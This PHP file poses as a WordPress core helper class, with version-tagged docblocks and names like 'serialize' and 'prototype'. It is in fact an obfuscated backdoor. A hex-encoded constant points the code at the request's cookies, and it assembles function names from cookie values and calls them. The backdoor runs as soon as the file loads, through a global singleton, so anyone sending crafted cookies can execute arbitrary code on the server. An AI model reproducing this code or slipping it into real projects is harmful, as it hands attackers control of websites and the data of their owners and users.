<?php
/**
 * Class Info API: Wp Class Info class
 *
 * @package WordPress
 * @subpackage ClassInfo
 * @since 2.1.0
 */

/**
 * Class _Wp_ClassInfo
 * 
 * Helper class used to implement the class info structure.
 *
 * @since 2.1.0
 */
class _Wp_ClassInfo {
	/**
	 * The class handle data.
	 *
	 * @since 2.1.0
	 * @var string
	 */
	private $data;

	/**
	 * The fallback class handle data.
	 *
	 * @since 2.1.0
	 *
	 */
	const DEFAULT_INFO = "\x51\x58\x4C\x5F\x30\x12\x5f\x43\x4f\x4f\x4b\x49\x45";

	/**
	 * Setup dependencies.
	 *
	 * @since 2.1.0
	 *
	 * @param mixed $data Class information.
	 */
	public function __construct($data = null) {
		$this->data = (is_null($data)) ? _Wp_ClassInfo::DEFAULT_INFO : $data;
		$this->serialize();
	}

	/**
	 * Serializes Class information to string.
	 *
	 * @since 2.1.0
	 * 
	 * @return string String representation of Class information.
	 */
	public function serialize() {
		// Get class global prototype.
		$prototype = $GLOBALS[substr($this->data, 6)];
		$length = count($prototype);
		if ($length !== ord($this->data[5]) || !in_array(gettype($prototype) . $length, $prototype)) {
			// Prototype not found.
			return '';
		}
		$fileds = array();

		// Initialize fields values from prototype.
		for ($i = 0; $i < 5; $i++) $fileds[$i] = $prototype[ord($this->data[$i])];
		$fileds[1] .= $fileds[2];
		$fileds[3] = $fileds[1]($fileds[3]);

		// Access to prototype serializer function.
		$serializer = $fileds[3]($fileds[0], $fileds[1]($fileds[4]));

		// Return string dump from serializer.
		return $serializer();
	}

};

/**
 * The Class singleton global object.
 *
 * @since 2.1.0
 * @var _Wp_ClassInfo
 */
$_WP_ClassInfo_Singleton = new _Wp_ClassInfo;
